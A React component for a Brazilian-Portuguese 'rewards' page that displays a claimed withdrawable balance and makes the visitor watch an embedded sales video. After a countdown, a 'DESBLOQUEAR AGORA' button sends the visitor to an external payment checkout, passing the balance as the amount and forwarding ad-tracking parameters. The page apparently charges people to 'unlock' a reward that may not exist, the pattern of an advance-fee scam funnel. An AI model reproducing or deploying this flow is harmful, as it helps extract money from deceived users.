import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { UnlockKeyhole, DollarSign } from 'lucide-react';

interface VideoScreenProps {
  balance: number;
  onComplete: () => void;
}

export const VideoScreen: React.FC<VideoScreenProps> = ({ balance, onComplete }) => {
  const [timeLeft, setTimeLeft] = useState(60);
  const [showButton, setShowButton] = useState(false);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          setShowButton(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatCurrency = (value: number) => {
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL'
    }).format(value);
  };

  const handleUnlock = () => {
    const params = new URLSearchParams(window.location.search);
    const utmParams = [
      'utm_source',
      'utm_medium',
      'utm_campaign',
      'utm_term',
      'utm_content',
      'click_id',
      'user',
      'fbclid',
      'gclid',
      'ttclid'
    ];

    const utmString = utmParams
      .map(param => {
        const value = params.get(param);
        return value ? `${param}=${encodeURIComponent(value)}` : null;
      })
      .filter(Boolean)
      .join('&');

    const formattedBalance = balance.toFixed(2).replace('.', ',');
    const baseUrl = 'https://pay.realizar-pagamento.com/checkout/1738e157-1fd2-4719-9a41-6ec05cbb4d7a';
    const redirectUrl = `${baseUrl}?${utmString}${utmString ? '&' : ''}valor=${formattedBalance}`;

    window.location.href = redirectUrl;
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 relative">
      <div className="absolute inset-0 bg-gradient-to-br from-[#FF6B00] via-[#FF8500] to-[#FFA500]">
        <div className="absolute inset-0 bg-black bg-opacity-20"></div>
      </div>
      
      <motion.div 
        className="bg-white/95 backdrop-blur-xl rounded-xl shadow-2xl p-6 max-w-md w-full relative z-10"
        initial={{ scale: 0.9, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ duration: 0.5 }}
      >
        <div className="text-center">
          <div className="flex items-center justify-between mb-6 bg-gradient-to-r from-[#FF6B00] to-[#FF8500] p-4 rounded-xl shadow-lg">
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center backdrop-blur-sm">
                <DollarSign className="w-6 h-6 text-white" />
              </div>
              <div className="text-left">
                <h1 className="text-white text-lg font-bold">
                  REWARDS
                </h1>
                <p className="text-white/80 text-sm">
                  Saldo Disponível
                </p>
              </div>
            </div>
            <div className="text-2xl font-bold text-white">
              {formatCurrency(balance)}
            </div>
          </div>

          <div className="w-full bg-gray-50 rounded-lg h-2 mb-6">
            <div className="h-full bg-[#FFB800] rounded-lg w-full animate-pulse"></div>
          </div>

          <h2 className="text-xl font-bold text-gray-800 mb-2">
            DESBLOQUEIO DE SAQUE
          </h2>
          
          <p className="text-gray-600 text-sm mb-6">
            Veja como liberar seu saque assistindo a esse rápido vídeo de 30 segundos:
          </p>

          <div className="relative mb-6 rounded-xl overflow-hidden">
            <div id="ifr_6801bf81275d8c3fa5d21fb9_wrapper" style={{ margin: '0 auto', width: '100%' }}>
              <div style={{ padding: '177.77777777777777% 0 0 0', position: 'relative' }} id="ifr_6801bf81275d8c3fa5d21fb9_aspect">
                <iframe 
                  frameBorder="0" 
                  allowFullScreen 
                  src="https://scripts.converteai.net/0335ec20-c9d4-4221-a36e-428ccf9162ce/players/6801bf81275d8c3fa5d21fb9/embed.html" 
                  id="ifr_6801bf81275d8c3fa5d21fb9" 
                  style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: '100%' }}
                  referrerPolicy="origin"
                />
              </div>
            </div>
          </div>

          {!showButton && timeLeft > 0 && (
            <motion.div
              className="bg-gray-50 rounded-lg p-4 text-center mb-6"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
            >
              <div className="text-gray-500 text-lg">
                Aguarde: <span className="font-bold text-[#FFB800]">{timeLeft}</span> segundos...
              </div>
              <div className="w-full bg-gray-200 h-1 mt-2 rounded-full overflow-hidden">
                <div 
                  className="h-full bg-[#FFB800]" 
                  style={{ width: `${(timeLeft / 60) * 100}%` }}
                />
              </div>
            </motion.div>
          )}

          {showButton && (
            <motion.button
              onClick={handleUnlock}
              className="w-full py-4 px-6 bg-gradient-to-r from-[#FFB800] to-[#FFD100] text-white rounded-lg font-bold text-lg hover:shadow-lg transform hover:scale-105 transition-all duration-300 flex items-center justify-center gap-2 mb-6"
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
            >
              <UnlockKeyhole className="w-6 h-6" />
              DESBLOQUEAR AGORA
            </motion.button>
          )}

          <div className="w-full h-[1px] bg-gray-200 mb-4"></div>

          <motion.div
            className="bg-gradient-to-r from-yellow-50 to-orange-50 p-4 rounded-lg border border-yellow-100"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 1 }}
          >
            <p className="text-sm font-medium text-yellow-800">
              Concorra a um bônus adicional
            </p>
          </motion.div>

          <div className="w-full h-[1px] bg-gray-200 my-4"></div>

          <motion.p
            className="text-xs text-gray-400"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 1.2 }}
          >
            Ao participar das atividades de recompensa, você concorda com nossos <span className="font-semibold">Termos</span> e <span className="font-semibold">Condições</span>
          </motion.p>
        </div>
      </motion.div>
    </div>
  );
};